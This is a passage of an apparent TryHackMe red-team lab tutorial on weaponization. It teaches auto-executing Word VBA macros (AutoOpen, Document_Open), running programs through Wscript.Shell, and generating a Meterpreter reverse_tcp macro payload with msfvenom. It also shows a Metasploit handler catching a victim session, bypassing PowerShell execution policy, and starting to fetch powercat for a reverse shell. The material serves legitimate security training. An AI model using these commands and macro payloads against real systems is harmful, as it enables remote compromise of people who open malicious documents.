Weaponization_files/5e12755e9b891865c6ef07e25047060b.png"><img><br></p><p>In the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Macro name</span>&nbsp;section, we choose to name our macro as&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">THM</span><span style="font-size:1rem">. Note that we need&nbsp;</span><span style="font-size:1rem">to select from the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Macros in</span>&nbsp;<span style="font-size:1rem">list </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Document1</span><span style="font-size:1rem">&nbsp;and finally select&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">create</span><span style="font-size:1rem">. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Welcome to Weaponization Room!</span><span style="font-size:1rem">. We can do that using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MsgBox</span><span style="font-size:1rem">&nbsp;function as follows:</span></p>

<pre class=" language-javascript" tabindex="0"><code class=" language-javascript">Sub <span class="token constant">THM</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token function">MsgBox</span> <span class="token punctuation">(</span><span class="token string">"Welcome to Weaponization Room!"</span><span class="token punctuation">)</span>
End Sub</code></pre><span style="font-size:10px">

</span><p><span style="font-size:1rem">Finally, run the macro by </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">F5</span><span style="font-size:1rem"> or </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Run</span><span style="font-size:1rem"> â†’ </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Run Sub/UserForm</span><span style="font-size:1rem">.</span></p><p>Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">AutoOpen</span>&nbsp;and&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Document_open</span>.&nbsp;Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">THM</span>&nbsp;function.</p>
<pre class=" language-javascript" tabindex="0"><code class=" language-javascript">Sub <span class="token function">Document_Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token constant">THM</span>
End Sub

Sub <span class="token function">AutoOpen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token constant">THM</span>
End Sub

Sub <span class="token constant">THM</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token function">MsgBox</span> <span class="token punctuation">(</span><span class="token string">"Welcome to Weaponization Room!"</span><span class="token punctuation">)</span>
End Sub</code></pre>

<p>It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">.doc and</span>&nbsp;<span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">docm</span>. Now let's save the file as <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">Word 97-2003 Template</span> where the Macro is enabled by going to <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">File</span> â†’ <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">save Document1</span> and save as type â†’ <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">Word 97-2003 Document</span>&nbsp;and finally, <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">save</span>.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/a5e35b7436173da709dae5695c34d4f9.png"><br></p><p>Let's close the Word document that we saved.&nbsp;<span style="font-size:1rem">If we reopen the document file, Microsoft Word will show a security message indicating that </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Macros have been disabled</span><span style="font-size:1rem"> and give us the option to enable it. Let's enable it and move forward to check out the result.</span></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/e140bfbce59d6cf3e71489dba094adc2.png"><br></p><p>Once we allowed the&nbsp;<span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">Enable Content</span>, our macro gets executed as shown,</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/ca228c238732dcdf21139317992a0083.png"><br></p><p>Now edit the word document and create a macro function that executes a <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">calc.exe</span>&nbsp;or any executable file as proof of concept as follows,<br></p>

<pre class=" language-javascript" tabindex="0"><code class=" language-javascript">Sub <span class="token function"><span><a class="ut3YER9g glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;ut3YER9g&#39;)">PoC</a></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	Dim payload As String
	payload <span class="token operator">=</span> <span class="token string">"calc.exe"</span>
	<span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Run payload<span class="token punctuation">,</span><span class="token number">0</span>
End Sub</code></pre>

<p>To explain the code in detail, with&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Dim payload As String,</span><span style="font-size:1rem"> we declare </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, MeDimnlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">payload</span><span style="font-size:1rem">&nbsp;variable as a string using </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Dim</span><span style="font-size:1rem">&nbsp;keyword. With&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">payload = "calc.exe"</span><span style="font-size:1rem"> we are specifying the payload name and finally with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">CreateObject("Wscript.Shell").Run payload</span><span style="font-size:1rem"> we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the&nbsp;</span><span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">AutoOpen()</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">and</span><span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Document_open()</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">functions too.</span></p><p><span style="font-size:1rem">Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">AutoOpen()</span><span style="font-size:1rem"> and </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">Document_open()</span><span style="font-size:1rem"> functions before saving the document. Once the code works, now save the file and try to open it again.</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/5c80382621d3fcb578a9e128ca821e71.png" style="width:347.539px;height:349.312px"></p><p style="text-align:left">It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">msfvenom</span><span style="font-size:1rem">. We need to specify the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Payload</span><span style="font-size:1rem">,</span><span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">LHOST</span><span style="font-size:1rem">,&nbsp;</span><span style="font-size:1rem">and&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">LPORT,</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">which match what is in the Metasploit framework. Note that we specify the payload as&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">VBA</span><span style="font-size:1rem">&nbsp;to use it as a macro.</span></p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.50</span>.159.15 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f vba</span></span>
<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
</span></code>
</pre></div></div>
<p>The value of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">LHOST</span><span style="font-size:1rem">&nbsp;in the above terminal&nbsp;</span>is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.</p><p><b>Import to note</b> that one modification needs to be done to make this work.&nbsp; The output will be working on an MS excel sheet. Therefore, change the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Workbook_Open()</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">to&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Document_Open()</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">to make it suitable for MS word documents.</span></p><p>Now copy the output and save it into the macro editor of the MS word document, as we showed previously.</p><p>From the attacking machine, run the Metasploit framework and set the listener as follows:</p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfconsole -q</span></span>
<span class="token output"><span>msf5 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15
LHOST =&gt; 10.50.159.15
msf5 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf5 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
</span></span></code>
</pre></div></div>
<p>Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.</p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output"><span>msf5 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -&gt; 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter &gt;</span></span></code>
</pre></div></div>
<p>Now replicate and apply what we discussed to get a reverse shell!</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> PowerShell - PSH
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px"><span><a class="CFoYRHnx glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;CFoYRHnx&#39;)">PowerShell</a> (PSH)</span></span></p><p><span style="font-size:1rem"><span><a class="vJI1N1Ez glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;vJI1N1Ez&#39;)">PowerShell</a> is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">.NET</span><span style="font-size:1rem">&nbsp;with some exceptions for legacy uses. Check out the TryHackMe room, </span><a href="https://tryhackme.com/room/powershell" target="_blank">Hacking with PowerShell for more information about PowerShell</a><span style="font-size:1rem">.</span><br></p><p><span>Red teamers rely on <a class="3syjJYSE glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;3syjJYSE&#39;)">PowerShell</a> in performing various activities, including initial access, system enumerations, and many others.&nbsp;</span><span style="font-size:1rem"><span>Let's start by creating a straightforward <a class="umpngVtS glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;umpngVtS&#39;)">PowerShell</a> script that prints "</span></span>Welcome to the Weaponization Room!<span style="font-size:1rem">" as follows,</span></p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">Write-Output</span> <span class="token string">"Welcome to the Weaponization Room!"</span></code></pre>

<p>Save the file as&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm.ps1</span><span style="font-size:1rem">.&nbsp;</span><span style="font-size:1rem">With the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Write-Output</span><span style="font-size:1rem">, we print the message "Welcome to the Weaponization Room!" to the command prompt.&nbsp;</span><span style="font-size:1rem">Now let's run it and see the result.</span></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">CMD</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">C:\Users\thm\Desktop&gt;powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop&gt;
</span></code>
</pre></div></div>

<p><span style="font-size:24px">Execution Policy</span></p><p>PowerShell's execution policy is a&nbsp;<span style="font-weight:600" class="notion-enable-hover">security option</span><span> to protect the system from running malicious scripts. By default, Microsoft disables executing <a class="mR92kdhy glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;mR92kdhy&#39;)">PowerShell</a> scripts </span><span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">.ps1</span><span> for security purposes. The <a class="5BnvZhqo glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;5BnvZhqo&#39;)">PowerShell</a> execution policy is set to </span><span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">Restricted</span>, which means it permits individual commands but not run any scripts.<span style="font-size:1rem"><br></span></p><p><span>You can determine the current <a class="p3Emfbc2 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;p3Emfbc2&#39;)">PowerShell</a> setting of your Windows as follows,</span></p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">CMD</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">PS C:\Users\thm&gt; Get-ExecutionPolicy
Restricted</span></code>
</pre></div></div>
<p><span>We can also easily change the <a class="5fTg7buQ glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;5fTg7buQ&#39;)">PowerShell</a> execution policy by running:</span></p>
<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">CMD</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">PS C:\Users\thm\Desktop&gt; Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A</span></code></pre></div></div>
<p></p><p><span style="font-size:24px">Bypass Execution Policy</span></p><p><span>Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the <a class="NMj0OHvO glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;NMj0OHvO&#39;)">PowerShell</a> command to change it to your desired setting. For example, we can change it to </span><span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">bypass</span><span> policy which means nothing is blocked or restricted. This is useful since that lets us run our own <a class="cpWkqgqi glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;cpWkqgqi&#39;)">PowerShell</a> scripts.</span><span style="font-size:1rem"><br></span></p><p><span>In order to make sure our <a class="DPHV4SJl glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;DPHV4SJl&#39;)">PowerShell</a> file gets executed, we need to provide the bypass option in the arguments as follows,

</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">CMD</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token output">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!</span></code>
</pre></div></div>

<span style="color:rgb(55, 53, 47);font-family:ui-sans-serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;white-space:pre-wrap;caret-color:rgb(55, 53, 47)"><span>Now, let's try to get a reverse shell using one of the tools written in <a class="63M9UYYj glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;63M9UYYj&#39;)">PowerShell</a>, which is </span></span><span class="notion-enable-hover" style="outline:0px;white-space:pre-wrap;caret-color:rgb(55, 53, 47);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">powercat</span><span style="color:rgb(55, 53, 47);font-family:ui-sans-serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;white-space:pre-wrap;caret-color:rgb(55, 53, 47)">. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.</span><span style="font-size:1rem"><br></span><p></p>

<div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Terminal</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> clone https://github.com/besimorhino/powercat.git</span></span>
<span class="token output">Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
